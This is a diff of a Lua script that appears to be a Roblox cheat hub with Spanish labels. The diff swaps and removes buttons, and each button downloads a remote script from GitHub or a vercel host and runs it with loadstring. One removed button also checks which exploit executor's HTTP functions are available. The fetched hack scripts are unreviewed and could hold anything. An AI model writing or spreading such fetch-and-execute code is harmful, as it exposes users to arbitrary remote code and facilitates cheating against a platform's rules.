@@ -286,11 +286,6 @@ CharacterTab:CreateInput({Name="ID de Accesorio", PlaceholderText="Pon el ID del
 -- ============================================================
 -- SCRIPTS TAB
 -- ============================================================
-ScriptsTab:CreateButton({Name="Steal a Brainrot 2", Callback=function()
-print("Steal a Brainrot Script Executed")
-    local a,b,c=loadstring,(syn and syn.request)or(http and http.request)or(request)or(http_request),assert;c(a and b,"Executor not Supported")a(b({Url="https://makalhub.vercel.app/api/script/loader",Method="GET"}).Body)()
-end})
-
 ScriptsTab:CreateButton({Name="Hoho Hub", Callback=function()
 print("Hoho Hub Executed")
     loadstring(game:HttpGet("https://raw.githubusercontent.com/acsu123/HOHO_H/main/Loading_UI"))()
@@ -298,7 +293,7 @@ end})
 
 ScriptsTab:CreateButton({Name="Steal a Brainrot", Callback=function()
 print("Steal a Brainrot Script Executed")
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/Akbar123s/Script-Roblox-/refs/heads/main/nabaruBrainrot"))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/egor2078f/lurkhackv4/refs/heads/main/main.lua,true"))()
 end})
 
 ScriptsTab:CreateButton({Name="Grow a Garden", Callback=function()
